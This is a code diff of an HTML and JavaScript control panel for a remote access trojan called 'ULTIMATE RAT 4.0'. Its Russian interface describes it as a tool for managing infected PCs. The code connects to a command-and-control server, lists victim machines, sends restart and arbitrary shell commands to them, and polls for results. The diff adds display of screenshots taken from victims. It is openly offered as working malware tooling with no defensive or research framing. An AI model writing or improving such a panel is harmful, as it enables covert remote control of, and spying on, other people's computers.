@@ -5,139 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ULTIMATE RAT CONTROL</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #0a0f1e 0%, #1a1a2e 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #fff;
-            min-height: 100vh;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .header {
-            text-align: center;
-            padding: 30px 0;
-            background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .header h1 {
-            font-size: 2.5em;
-            background: linear-gradient(45deg, #e94560, #ff6b6b);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .server-config {
-            background: rgba(0,0,0,0.3);
-            border-radius: 15px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-        
-        .server-config input {
-            background: rgba(255,255,255,0.1);
-            border: 1px solid #e94560;
-            color: white;
-            padding: 8px;
-            border-radius: 8px;
-            width: 200px;
-            margin: 5px;
-        }
-        
-        .server-config button {
-            background: #e94560;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 8px;
-            color: white;
-            cursor: pointer;
-        }
-        
-        .client-card {
-            background: rgba(255,255,255,0.05);
-            border-radius: 15px;
-            padding: 15px;
-            margin-bottom: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        .client-card:hover {
-            background: rgba(255,255,255,0.1);
-            transform: translateX(5px);
-        }
-        
-        .client-card.selected {
-            background: linear-gradient(135deg, #e94560, #c73b54);
-            box-shadow: 0 5px 20px rgba(233,69,96,0.3);
-        }
-        
-        .client-name {
-            font-size: 1.2em;
-            font-weight: bold;
-        }
-        
-        .menu-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 15px;
-            margin-top: 30px;
-        }
-        
-        .menu-btn {
-            background: rgba(255,255,255,0.05);
-            border: none;
-            padding: 15px;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 1em;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        .menu-btn:hover {
-            background: #e94560;
-            transform: translateY(-3px);
-        }
-        
-        .status-bar {
-            background: rgba(0,0,0,0.5);
-            border-radius: 10px;
-            padding: 10px;
-            margin-top: 20px;
-            text-align: center;
-        }
-        
-        .command-output {
-            background: rgba(0,0,0,0.5);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-            font-family: monospace;
-            font-size: 0.9em;
-            max-height: 200px;
-            overflow-y: auto;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: linear-gradient(135deg, #0a0f1e 0%, #1a1a2e 100%); font-family: 'Segoe UI', sans-serif; color: #fff; min-height: 100vh; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; padding: 30px 0; background: rgba(0,0,0,0.3); border-radius: 20px; margin-bottom: 30px; }
+        .header h1 { font-size: 2.5em; background: linear-gradient(45deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .server-config { background: rgba(0,0,0,0.3); border-radius: 15px; padding: 15px; margin-bottom: 20px; }
+        .server-config input { background: rgba(255,255,255,0.1); border: 1px solid #e94560; color: white; padding: 8px; border-radius: 8px; width: 250px; margin: 5px; }
+        .server-config button { background: #e94560; border: none; padding: 8px 15px; border-radius: 8px; color: white; cursor: pointer; }
+        .client-card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 15px; margin-bottom: 10px; cursor: pointer; transition: all 0.3s ease; }
+        .client-card:hover { background: rgba(255,255,255,0.1); transform: translateX(5px); }
+        .client-card.selected { background: linear-gradient(135deg, #e94560, #c73b54); }
+        .client-name { font-size: 1.2em; font-weight: bold; }
+        .menu-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; margin-top: 30px; }
+        .menu-btn { background: rgba(255,255,255,0.05); border: none; padding: 15px; border-radius: 10px; color: #fff; font-size: 1em; cursor: pointer; transition: all 0.3s ease; }
+        .menu-btn:hover { background: #e94560; transform: translateY(-3px); }
+        .status-bar { background: rgba(0,0,0,0.5); border-radius: 10px; padding: 10px; margin-top: 20px; text-align: center; }
+        .command-output { background: rgba(0,0,0,0.5); border-radius: 10px; padding: 15px; margin-top: 20px; font-family: monospace; font-size: 0.9em; max-height: 200px; overflow-y: auto; }
+        .screenshot { margin-top: 20px; text-align: center; }
+        .screenshot img { max-width: 100%; border-radius: 10px; border: 2px solid #e94560; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🔥 ULTIMATE RAT 4.0 🔥</h1>
-            <p>Управление заражёнными ПК</p>
-        </div>
+        <div class="header"><h1>🔥 ULTIMATE RAT 4.0 🔥</h1><p>Управление заражёнными ПК</p></div>
         
         <div class="server-config">
             <h3>🌐 Настройки сервера</h3>
@@ -157,13 +48,11 @@
                 <button class="menu-btn" onclick="sendCommand('restart')">🔄 Перезагрузка</button>
                 <button class="menu-btn" onclick="openShell()">💻 Shell</button>
             </div>
-            
             <div class="command-output" id="output"></div>
+            <div class="screenshot" id="screenshot"></div>
         </div>
         
-        <div class="status-bar" id="status">
-            📡 Ожидание выбора клиента...
-        </div>
+        <div class="status-bar" id="status">📡 Ожидание выбора клиента...</div>
     </div>
     
     <script>
@@ -173,6 +62,7 @@
         
         let currentClient = null;
         let serverUrl = "";
+        let resultInterval = null;
         
         function connectToServer() {
             serverUrl = document.getElementById('serverUrl').value;
@@ -180,28 +70,24 @@
             document.getElementById('connStatus').style.color = '#00ff00';
             addOutput('🟢 Подключен к серверу: ' + serverUrl);
             refreshClients();
+            
+            if (resultInterval) clearInterval(resultInterval);
+            resultInterval = setInterval(checkResults, 3000);
         }
         
         async function refreshClients() {
-            if (!serverUrl) {
-                addOutput('❌ Сначала подключись к серверу');
-                return;
-            }
-            
+            if (!serverUrl) { addOutput('❌ Сначала подключись к серверу'); return; }
             try {
                 let response = await fetch(`${serverUrl}/clients`);
                 let data = await response.json();
                 updateClientsList(data.clients);
                 addOutput(`📡 Получено ${data.clients.length} клиентов`);
-            } catch(e) {
-                addOutput('❌ Ошибка получения клиентов: ' + e.message);
-            }
+            } catch(e) { addOutput('❌ Ошибка: ' + e.message); }
         }
         
         function updateClientsList(clients) {
             let container = document.getElementById('clients-list');
             container.innerHTML = '';
-            
             for (let client of clients) {
                 let div = document.createElement('div');
                 div.className = 'client-card';
@@ -210,55 +96,53 @@
                 div.innerHTML = `<div class="client-name">🖥️ ${client}</div>`;
                 container.appendChild(div);
             }
-            
-            if (clients.length === 0) {
-                container.innerHTML = '<div style="text-align:center;padding:20px;">⚠️ Нет активных клиентов</div>';
-            }
+            if (clients.length === 0) container.innerHTML = '<div style="text-align:center;padding:20px;">⚠️ Нет активных клиентов</div>';
         }
         
         function selectClient(clientId) {
             currentClient = clientId;
-            
-            document.querySelectorAll('.client-card').forEach(card => {
-                card.classList.remove('selected');
-            });
+            document.querySelectorAll('.client-card').forEach(c => c.classList.remove('selected'));
             document.querySelector(`[data-id="${clientId}"]`).classList.add('selected');
-            
             document.getElementById('commands-panel').style.display = 'block';
             document.getElementById('status').innerHTML = `✅ Управление: ${clientId}`;
             addOutput(`✅ Выбран клиент: ${clientId}`);
         }
         
         async function sendCommand(cmd) {
-            if (!currentClient) {
-                alert('Сначала выбери клиента!');
-                return;
-            }
+            if (!currentClient) { alert('Сначала выбери клиента!'); return; }
+            if (!serverUrl) { alert('Сначала подключись к серверу!'); return; }
             
-            if (!serverUrl) {
-                alert('Сначала подключись к серверу!');
-                return;
-            }
-            
-            addOutput(`📤 Отправлено: ${cmd} клиенту ${currentClient}`);
-            
+            addOutput(`📤 Отправлено: ${cmd} → ${currentClient}`);
             try {
                 await fetch(`${serverUrl}/command`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({client_id: currentClient, command: cmd})
                 });
-                addOutput(`✅ Команда отправлена`);
-            } catch(e) {
-                addOutput(`❌ Ошибка: ${e.message}`);
-            }
+                addOutput(`✅ Команда отправлена, ожидание результата...`);
+            } catch(e) { addOutput(`❌ Ошибка: ${e.message}`); }
+        }
+        
+        async function checkResults() {
+            if (!currentClient || !serverUrl) return;
+            try {
+                let response = await fetch(`${serverUrl}/results/${currentClient}`);
+                let data = await response.json();
+                for (let result of data.results) {
+                    if (result.startsWith('[SCREENSHOT]')) {
+                        let imgData = result.substring(11);
+                        document.getElementById('screenshot').innerHTML = `<img src="data:image/png;base64,${imgData}">`;
+                        addOutput(`📸 Скриншот получен`);
+                    } else {
+                        addOutput(`📟 Результат: ${result}`);
+                    }
+                }
+            } catch(e) {}
         }
         
         function openShell() {
             let shellCmd = prompt('Введи команду для выполнения:');
-            if (shellCmd) {
-                sendCommand(`shell:${shellCmd}`);
-            }
+            if (shellCmd) sendCommand(`shell:${shellCmd}`);
         }
         
         function addOutput(text) {
@@ -273,6 +157,7 @@
         tg.MainButton.show();
         
         addOutput('🔥 ULTIMATE RAT 4.0 готов к работе');
+        addOutput('📡 Введи IP сервера и нажми "Подключиться"');
     </script>
 </body>
 </html>
